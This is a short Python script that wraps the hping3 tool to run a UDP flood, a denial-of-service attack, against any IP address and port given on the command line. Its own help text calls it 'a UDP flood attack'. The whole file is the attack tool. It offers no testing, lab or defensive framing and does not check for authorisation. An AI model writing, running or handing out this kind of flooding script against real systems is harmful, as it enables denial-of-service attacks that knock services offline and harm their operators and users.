import subprocess
import argparse

def run_udp_flood(target_ip, target_port):
    try:
        command = ["hping3", "--udp", "--flood", "-p", str(target_port), target_ip]
        print(f"Executing command: {' '.join(command)}")  # Debug output
        subprocess.run(command, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error running hping3: {e}")
    except FileNotFoundError:
        print("Error: hping3 is not installed. Please install it and try again.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Run a UDP flood attack using hping3.")
    parser.add_argument("target_ip", help="The IP address of the target machine")
    parser.add_argument("target_port", type=int, help="The target UDP port")
    args = parser.parse_args()
    
    run_udp_flood(args.target_ip, args.target_port)
